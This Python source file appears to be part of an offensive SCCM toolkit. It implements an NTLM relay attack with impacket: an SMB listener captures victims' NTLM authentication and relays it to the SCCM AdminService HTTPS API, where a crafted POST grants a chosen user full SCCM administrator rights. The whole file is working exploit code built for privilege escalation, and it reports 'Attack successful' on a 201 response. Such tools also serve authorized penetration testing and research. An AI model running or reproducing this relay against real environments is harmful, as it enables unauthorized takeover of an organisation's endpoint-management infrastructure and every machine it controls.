import base64
import time
import json
import ssl
import sys
import urllib.parse
import os
from struct import unpack
from threading import Lock

from impacket.examples.ntlmrelayx.attacks import ProtocolAttack
from impacket.examples.ntlmrelayx.clients.httprelayclient import HTTPSRelayClient
from impacket.examples.ntlmrelayx.servers import SMBRelayServer
from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
from impacket.nt_errors import STATUS_ACCESS_DENIED, STATUS_SUCCESS
from impacket.ntlm import NTLMAuthChallengeResponse
from impacket.spnego import SPNEGO_NegTokenResp

try:
    from http.client import HTTPConnection, HTTPSConnection
except ImportError:
    from httplib import HTTPConnection, HTTPSConnection


from lib.logger import logger

ELEVATED = []
SUCCESS = False

def jprint(obj):
    json_data = json.loads(obj)
    text = json.dumps(json_data, sort_keys=True, indent=4)
    print(text)
    return
    
class SCCMHTTPSRelayClient(HTTPSRelayClient):
    PLUGIN_NAME = "HTTPS"
    def initConnection(self):
        self.lastresult = None
        if self.target.path == '':
            self.path = '/'
        else:
            self.path = self.target.path
        self.query = self.target.query
        try:
            uv_context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
            self.session = HTTPSConnection(self.targetHost,self.targetPort, context=uv_context)
        except AttributeError:
            self.session = HTTPSConnection(self.targetHost,self.targetPort)
        return True

    def sendAuth(self, authenticateMessageBlob, serverChallenge=None):
        self.SCCM_relay.attack_lock.acquire()
        try:
            response = self._sendAuth(authenticateMessageBlob, serverChallenge)
        except Exception as e:
            logger.info(f"Something went wrong:\n{e}")
            response = None, STATUS_ACCESS_DENIED
        finally:
            self.SCCM_relay.attack_lock.release()
            return response

    def _sendAuth(self, authenticateMessageBlob, serverChallenge=None):
        global SUCCESS
        
        if (
            unpack("B", authenticateMessageBlob[:1])[0]
            == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP
        ):
            respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)
            token = respToken2["ResponseToken"]
        else:
            token = authenticateMessageBlob

        try:
            response = NTLMAuthChallengeResponse()
            response.fromString(data=token)

            domain = response["domain_name"].decode("utf-16le")
            username = response["user_name"].decode("utf-16le")

            self.user = "%s\\%s" % (domain, username)
            self.session.user = self.user
            if self.user not in ELEVATED:
                ELEVATED.append(self.user)
                logger.info(f"Authenticating with user: {self.user}")
                
                auth = base64.b64encode(token).decode("ascii")
                headers = {'Authorization':'%s %s' % ('Negotiate', auth),'Content-Type': 'application/json; odata=verbose'}
                
                data = {
                    "LogonName": self.SCCM_relay.target_user, 
                    "AdminSid": self.SCCM_relay.target_sid,
                    "Permissions": [
                        {
                            "CategoryID": "SMS00ALL", 
                            "CategoryTypeID": 29, 
                            "RoleID":"SMS0001R",
                        },
                        {
                            "CategoryID": "SMS00001",
                            "CategoryTypeID": 1, 
                            "RoleID":"SMS0001R", 
                        },
                        {
                            "CategoryID": "SMS00004", 
                            "CategoryTypeID": 1, 
                            "RoleID":"SMS0001R",
                        }
                    ],
                    "DisplayName": self.SCCM_relay.target_user
                }

                body = json.dumps(data) 

                self.session.request("POST", self.path, headers=headers, body=body)
                res = self.session.getresponse()
                response_data = res.read()
                if res.status == 201:
                    logger.info("Attack successful")
                    logger.info(f"Target user {self.SCCM_relay.target_user} added as an SCCM admin")
                    response_content = response_data.decode('utf-8')
                    logger.debug(f"Response data:")
                    jprint(response_content)
                    SUCCESS = True
                    return
                if res.status == 401:
                    logger.info("Got unauthorized response from SCCM AdminService")
                    SUCCESS = True
                    return
                else:
                    logger.info(f"Unexpected status code: {res.status}")
                    logger.debug(f"Response data: {response_data.decode('utf-8', errors='ignore')}")
                    SUCCESS = True
                    return
        except Exception as e:
            logger.info(f"Something went wrong:\n{e}")
            SUCCESS = True
            return
        
        

class HTTPSCCMRELAY:
    def __init__(self, target:str, target_user:str, target_sid:str, interface:str, port:int, timeout:int, verbose:bool,
    ):
        self.target = f"https://{target}/AdminService/wmi/SMS_Admin"
        self.interface = interface
        self.port = port
        self.timeout = timeout
        self.attacked_targets = []
        self.attack_lock = Lock()
        self.server = None
        self.headers = None
        self.session_info = None
        self.verbose = verbose
        self.target_user = target_user
        self.target_sid = target_sid

        logger.info("Targeting SCCM AdminService at %s" % self.target)

        target_processor = TargetsProcessor(
            singleTarget=self.target, 
            protocolClients={"HTTPS": self.get_relay_https_client}
        )
        config = NTLMRelayxConfig()
        config.setTargets(target_processor)
        config.setProtocolClients({"HTTPS": self.get_relay_https_client})
        config.setListeningPort(port)
        config.setInterfaceIp(interface)
        config.setSMB2Support(True)
        config.setMode("RELAY")

        self.server = SMBRelayServer(config)

    def start(self):
        """All taken from Certipy's relay implementation https://github.com/ly4k/Certipy"""
        logger.info("Listening on %s:%d" % (self.interface, self.port))
        logger.info("Waiting for incoming connections...")

        self.server.start()

        start_time = time.time()
        
        try:
            # Main loop with timeout check
            while not SUCCESS:                    
                time.sleep(0.1)
                
        except KeyboardInterrupt:
            logger.info("Keyboard interrupt received, exiting...")
        except Exception as e:
            logger.error(f"Error in main loop: {e}")
        finally:
            self.exit()

    def get_relay_https_client(self, *args, **kwargs):
        relay_client = SCCMHTTPSRelayClient(*args, **kwargs)
        relay_client.SCCM_relay = self
        return relay_client

    def exit(self):
        logger.info("Job's done")
        
        # Properly shutdown the SMB server
        if self.server:
            try:
                # Try to properly shutdown the underlying socketserver
                if hasattr(self.server.server, 'shutdown'):
                    logger.debug("Shutting down socket server...")
                    self.server.server.shutdown()
                    
                # For older Python versions or different server implementations
                if hasattr(self.server.server, 'socket'):
                    logger.debug("Closing server socket...")
                    self.server.server.socket.close()
                    
                # Set server to None to release references
                self.server = None
                logger.debug("Server reference cleared")
                
            except Exception as e:
                logger.debug(f"Error during server shutdown: {e}")
        
        # Force exit to ensure no hanging threads
        logger.info("Exiting...")
        os._exit(0)
        